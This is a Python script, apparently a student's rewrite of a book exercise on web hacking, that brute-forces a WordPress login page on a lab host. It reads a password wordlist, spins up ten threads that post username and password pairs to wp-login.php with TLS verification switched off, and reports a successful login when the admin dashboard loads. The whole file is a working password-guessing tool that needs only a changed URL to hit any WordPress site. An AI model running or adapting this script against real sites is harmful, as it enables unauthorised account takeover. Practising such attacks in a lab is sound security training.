from queue import Queue

import asyncio
import requests
import threading
#? use the lscpu command in Linux to identify how many threads on a system


TARGET = 'http://wordpress.agoge.io/wp-login.php'
WORDLIST = './Chapter5-WebHackery/ago_00_needed_lab/wordlist.txt'

WP_LOGIN = 'http://wordpress.agoge.io/wp-login.php/'
WP_ADMIN = 'http://wordpress.agoge.io/wp-admin/'
THREAD_COUNT = 10

#! This file was written from scratch, I ran into to many issues with the 
#! books code.  It was faster to start over. 

def get_passwords():
    with open(WORDLIST) as file:
        raw_words = file.read()

    word_queue = Queue()
    
    for word in raw_words.split():
        word_queue.put(word)
    
    return word_queue


class wp_brute:
    def __init__(self) -> None:
        self.authenticated = False
        self.threads_list = []

    def wp_auth(self, username, password_queue):
    #? Had to change the inital definition from a single password to a password Queue

        #? - 2 - Wrapped the call in a while loop for each password in the queue
        while not password_queue.empty() and self.authenticated is not True:
            password = password_queue.get()
        #? - 2 - End 2


            #? - 1 - Started with this section block to prove that authentication was working 
            with requests.Session() as session:
                data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit':'Log In',
                    'redirect_to': WP_ADMIN
                }

                session.post(WP_LOGIN, data=data, verify=False)
                response = session.get(WP_ADMIN)

                if 'dashboard' in response.text.lower():
                    self.authenticated = True
                    #? Wrapped everything in a class to get access to variables
                    print(f'Successful login with username: {username} and password: {password}')
            #? - 1 - End 1


    def run_wp_bruteforce(self, username, password_queue):
    #? Spins up threads for brute forcing
        for i in range(10):
            thread = threading.Thread(target=self.wp_auth, args=(username,password_queue,))
            self.threads_list.append(thread)
            thread.start()


        # async with asyncio.TaskGroup() as tg:
        #     task = tg.create_task(self.wp_auth(username=username, password_queue=password_queue))
        #     await print(task)
        # print('Async finished')
            

    def check_status(self):
    #? Still trying to check the status to print out a message if there's no login
        for t in self.threads_list:
            t.join()
            if self.authenticated == False:
                print('No auth')
        

if __name__ == '__main__':
    password_queue = get_passwords()
    wpb = wp_brute()
    wpb.run_wp_bruteforce(username='python', password_queue=password_queue)
    # wpb.check_status()